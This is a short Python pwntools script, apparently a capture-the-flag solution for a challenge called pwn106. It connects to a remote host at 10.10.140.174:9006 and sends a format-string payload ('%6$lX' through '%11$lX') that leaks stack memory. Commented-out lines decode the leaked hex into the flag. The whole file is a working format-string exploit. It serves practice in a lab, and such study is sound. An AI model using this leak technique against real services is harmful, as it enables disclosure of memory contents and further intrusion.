from pwn import *

#context.binary = binary = "./pwn106user.pwn106-user"
p = remote("10.10.140.174", 9006)
payload = "%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"


#p = process()

p.recv()
p.recv()
p.sendline(payload)
print(p.recvall())
#output = p.recv().strip().split(b" ")[1].split(b".")

#flag = ""

#for word in output:

 #   flag += bytes.fromhex(word.decode("utf-8"))[::-1].decode("utf-8")

#print("this is flag {}".format(flag))
